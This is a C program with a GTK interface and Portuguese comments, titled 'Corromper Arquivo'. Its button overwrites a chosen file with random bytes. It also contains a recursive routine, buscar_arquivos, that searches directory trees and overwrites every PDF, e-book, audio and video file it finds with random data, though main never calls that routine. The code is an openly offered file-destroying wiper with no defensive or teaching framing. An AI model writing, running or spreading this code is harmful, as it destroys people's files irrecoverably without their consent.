#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <gtk/gtk.h>

// função para corromper arquivo
void corromper_arquivo(char* path){
  FILE *arquivo;
  int i;
  arquivo = fopen(path, "wb");
  if (arquivo != NULL){
    // Escreve caracteres aleatórios no arquivo
    for(i=0; i<10000; i++){
      fputc(rand()%256, arquivo);
    }
    fclose(arquivo);
  }
}

// função para buscar arquivos nos diretórios
void buscar_arquivos(char* diretorio){
  DIR *dir;
  struct dirent *ent;
  char* caminho;

  if ((dir = opendir (diretorio)) != NULL) {
    while ((ent = readdir (dir)) != NULL) {
      // Ignora os diretórios . e ..
      if (strcmp(ent->d_name,".")!=0 && strcmp(ent->d_name,"..")!=0){
        caminho = malloc(strlen(diretorio)+strlen(ent->d_name)+2);
        strcpy(caminho,diretorio);
        strcat(caminho,"/");
        strcat(caminho,ent->d_name);
        // Verifica se é um arquivo ou diretório
        if(ent->d_type == DT_DIR){
          buscar_arquivos(caminho);
        }else{
          // Verifica se é um arquivo com a extensão desejada
          char *extensao = strrchr(ent->d_name, '.');
          if (extensao != NULL && 
              (strcmp(extensao, ".pdf") == 0 ||
               strcmp(extensao, ".epub") == 0 ||
               strcmp(extensao, ".mobi") == 0 ||
               strcmp(extensao, ".mp3") == 0 ||
               strcmp(extensao, ".wav") == 0 ||
               strcmp(extensao, ".mp4") == 0 ||
               strcmp(extensao, ".webm") == 0 ||
               strcmp(extensao, ".wmv") == 0)){
            corromper_arquivo(caminho);
          }
        }
        free(caminho);
      }
    }
    closedir (dir);
  } 
}

// função para lidar com eventos do botão
void on_button_clicked(GtkButton *button, gpointer user_data){
  GtkWidget *dialog;
  GtkFileChooserAction action = GTK_FILE_CHOOSER_ACTION_OPEN;
  gint res;

  dialog = gtk_file_chooser_dialog_new("Selecione um arquivo", GTK_WINDOW(user_data), action, "_Cancelar", GTK_RESPONSE_CANCEL, "_Abrir", GTK_RESPONSE_ACCEPT, NULL);

    res = gtk_dialog_run(GTK_DIALOG(dialog));
    if (res == GTK_RESPONSE_ACCEPT){
        GtkFileChooser *chooser = GTK_FILE_CHOOSER(dialog);
        const char *filename = gtk_file_chooser_get_filename(chooser);
        // abra o arquivo e escreva caracteres aleatórios
        FILE *file = fopen(filename, "w");
        if (file){
            srand(time(NULL));
            int i;
            for (i = 0; i < 1000000; i++){
                char c = (char)(rand() % 256);
                fputc(c, file);
            }
            fclose(file);
        }
    }
    gtk_widget_destroy(dialog);
}

int main(int argc, char *argv[]){
    // inicialize o GTK
    gtk_init(&argc, &argv);

    // crie a janela principal
    GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(window), "Corromper Arquivo");
    gtk_window_set_position(GTK_WINDOW(window), GTK_WIN_POS_CENTER);
    gtk_container_set_border_width(GTK_CONTAINER(window), 10);
    gtk_widget_set_size_request(window, 300, 150);

    // crie a caixa de conteúdo
    GtkWidget *box = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0);
    gtk_container_add(GTK_CONTAINER(window), box);

    // crie o botão para selecionar o arquivo
    GtkWidget *button = gtk_button_new_with_label("Selecionar Arquivo");
    g_signal_connect(button, "clicked", G_CALLBACK(on_button_clicked), window);
    gtk_box_pack_start(GTK_BOX(box), button, TRUE, TRUE, 0);

    // exiba a janela principal
    gtk_widget_show_all(window);
    gtk_main();

    return 0;
}